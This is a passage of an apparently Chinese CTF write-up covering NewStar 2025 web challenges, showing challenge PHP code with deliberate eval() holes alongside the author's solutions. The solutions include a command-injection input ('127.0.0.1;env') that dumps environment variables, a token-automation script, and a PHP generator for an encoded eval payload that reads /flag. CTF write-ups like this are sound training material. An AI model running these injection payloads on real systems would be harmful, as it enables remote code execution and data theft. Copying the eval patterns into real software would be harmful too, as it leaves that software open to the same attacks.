+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请输入有效的表达式&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nv">$test</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\$</span><span class="s2">test = </span><span class="si">$input</span><span class="s2">;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Error</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;表达式错误&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$test</span> <span class="o">==</span> <span class="mi">2025</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$flag</span> <span class="o">=</span> <span class="nx">generate_dynamic_flag</span><span class="p">(</span><span class="nv">$flag_secret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;success&#39;&gt;拿下flag！&lt;/div&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;flag-container&#39;&gt;&lt;div class=&#39;flag&#39;&gt;FLAG: </span><span class="si">{</span><span class="nv">$flag</span><span class="si">}</span><span class="s2">&lt;/div&gt;&lt;/div&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;error&#39;&gt;大哥哥泥把数字算错了: </span><span class="si">$test</span><span class="s2"> ≠ 2025&lt;/div&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php } ?&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>代码限制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">不能是数组：is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="nx">必须为</span> <span class="k">false</span>
+</span></span><span class="line"><span class="cl"><span class="nx">字符限制：只能包含</span> <span class="nx">\d</span><span class="o">*</span><span class="nx">\</span><span class="o">/~</span><span class="p">()</span><span class="nx">\s（数字、</span><span class="o">*</span><span class="nx">、</span><span class="o">/</span><span class="nx">、</span><span class="o">~</span><span class="nx">、括号、空格）</span>
+</span></span><span class="line"><span class="cl"><span class="nx">不能纯数字：preg_match</span><span class="p">(</span><span class="s1">&#39;/^[\d\s]+$/&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">)</span> <span class="nx">必须为</span> <span class="k">false</span>
+</span></span><span class="line"><span class="cl"><span class="nx">目标：</span><span class="nv">$test</span> <span class="nx">必须等于</span> <span class="mi">2025</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那很简单了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">*</span><span class="mi">1</span>		<span class="c1">//	2025/1
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="week2">week2
+</h1><h2 id="dd加速器">DD加速器
+</h2><p>127.0.0.1;env就行，flag在环境</p>
+<img src="image-20251007143627000.png" alt="image-20251007143627000" style="zoom:50%;" />
+<h2 id="白帽小k的故事1">白帽小K的故事（1）
+</h2><h2 id="搞点哦润吉吃吃橘">搞点哦润吉吃吃橘
+</h2><p><img src="/p/2025-newstar/image-20251007160143196.png"
+	width="1337"
+	height="376"
+	srcset="/p/2025-newstar/image-20251007160143196_hu_b705af0ac520660a.png 480w, /p/2025-newstar/image-20251007160143196_hu_c05e5468172c2be7.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251007160143196"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="355"
+		data-flex-basis="853px"
+	
+></p>
+<p><img src="/p/2025-newstar/image-20251007160159396.png"
+	width="1261"
+	height="516"
+	srcset="/p/2025-newstar/image-20251007160159396_hu_c4fad12833806d26.png 480w, /p/2025-newstar/image-20251007160159396_hu_f6a70e02e4653e38.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251007160159396"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p>根据提示发现，start_challenge路由的响应set-cookie中的session作为verify_token中的session才行，然后我们再写代码提取token计算式然后计算提交就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">auto_challenge</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;https://eci-2ze9i5ld3m7d7x4xrtqn.cloudeci1.ichunqiu.com:5000/&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="s2">&#34;session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiRG9ybyJ9.aOTHvQ.b-mL3B7omr-6O1FRTNHSXya64GM&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 1. 启动挑战</span>
+</span></span><span class="line"><span class="cl">        <span class="n">start_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/start_challenge&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">start_response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 2. 获取新的session cookie</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_session_cookie</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Set-Cookie&#39;</span> <span class="ow">in</span> <span class="n">start_response</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">set_cookie</span> <span class="o">=</span> <span class="n">start_response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;session=&#39;</span> <span class="ow">in</span> <span class="n">set_cookie</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_session_cookie</span> <span class="o">=</span> <span class="n">set_cookie</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;session=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="n">new_session_cookie</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">start_data</span> <span class="o">=</span> <span class="n">start_response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;error&#34;</span> <span class="ow">in</span> <span class="n">start_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 3. 获取表达式并计算token</span>
+</span></span><span class="line"><span class="cl">        <span class="n">expression</span> <span class="o">=</span> <span class="n">start_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;expression&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">expression</span> <span class="ow">or</span> <span class="s2">&#34;token =&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">expression</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">calc_expr</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;token =&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">calc_expr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 4. 提交验证</span>
+</span></span><span class="line"><span class="cl">        <span class="n">submit_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">token</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">submit_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;session=</span><span class="si">{</span><span class="n">new_session_cookie</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">}</span> <span class="k">if</span> <span class="n">new_session_cookie</span> <span class="k">else</span> <span class="n">headers</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">submit_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/verify_token&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">submit_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">submit_headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">submit_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;错误: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">auto_challenge</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="真的是签到诶">真的是签到诶
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$cipher</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cipher&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">atbash</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">foreach</span> <span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$char</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">ctype_alpha</span><span class="p">(</span><span class="nv">$char</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$is_upper</span> <span class="o">=</span> <span class="nx">ctype_upper</span><span class="p">(</span><span class="nv">$char</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$base</span> <span class="o">=</span> <span class="nv">$is_upper</span> <span class="o">?</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$offset</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$char</span><span class="p">))</span> <span class="o">-</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$new_char</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="p">(</span><span class="mi">25</span> <span class="o">-</span> <span class="nv">$offset</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$result</span> <span class="o">.=</span> <span class="nv">$new_char</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$result</span> <span class="o">.=</span> <span class="nv">$char</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$cipher</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$cipher</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$encoded</span> <span class="o">=</span> <span class="nx">atbash</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$encoded</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$encoded</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$encoded</span> <span class="o">=</span> <span class="nx">str_rot13</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$question</span> <span class="o">=</span> <span class="s2">&#34;真的是签到吗？&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$answer</span> <span class="o">=</span> <span class="s2">&#34;真的很签到诶！&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$res</span> <span class="o">=</span>  <span class="nv">$question</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span> <span class="o">.</span> <span class="nv">$answer</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$res</span> <span class="o">.</span> <span class="nv">$res</span> <span class="o">.</span> <span class="nv">$res</span> <span class="o">.</span> <span class="nv">$res</span> <span class="o">.</span> <span class="nv">$res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">?</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>过程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Base64解码：</span><span class="nv">$cipher</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Atbash加密：</span><span class="nv">$encoded</span> <span class="o">=</span> <span class="nx">atbash</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">去除空格：</span><span class="nv">$encoded</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$encoded</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ROT13加密：</span><span class="nv">$encoded</span> <span class="o">=</span> <span class="nx">str_rot13</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">代码执行：</span><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以逆向代码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 简化版Payload生成器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">atbash</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$char</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">ctype_alpha</span><span class="p">(</span><span class="nv">$char</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$is_upper</span> <span class="o">=</span> <span class="nx">ctype_upper</span><span class="p">(</span><span class="nv">$char</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$base</span> <span class="o">=</span> <span class="nv">$is_upper</span> <span class="o">?</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$offset</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$char</span><span class="p">))</span> <span class="o">-</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$new_char</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="p">(</span><span class="mi">25</span> <span class="o">-</span> <span class="nv">$offset</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$result</span> <span class="o">.=</span> <span class="nv">$new_char</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$result</span> <span class="o">.=</span> <span class="nv">$char</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="s2">&#34;show_source(&#39;/flag&#39;);&#34;</span><span class="p">;</span>  <span class="c1">// print_r(scandir(&#39;/&#39;));		绕过空格
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 生成payload - 逆向构造
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$rot13_decoded</span> <span class="o">=</span> <span class="nx">str_rot13</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>    <span class="c1">// ROT13解密 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$atbash_decoded</span> <span class="o">=</span> <span class="nx">atbash</span><span class="p">(</span><span class="nv">$rot13_decoded</span><span class="p">);</span> <span class="c1">// Atbash解密，这个函数既是加密也是解密，因为Atbash是自逆的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$atbash_decoded</span><span class="p">);</span> <span class="c1">// Base64编码 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;原始代码: </span><span class="si">$code\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;ROT13解密: </span><span class="si">$rot13_decoded\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Atbash解密: </span><span class="si">$atbash_decoded\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;最终Payload: </span><span class="si">$payload\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;POST数据: cipher=</span><span class="si">$payload\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
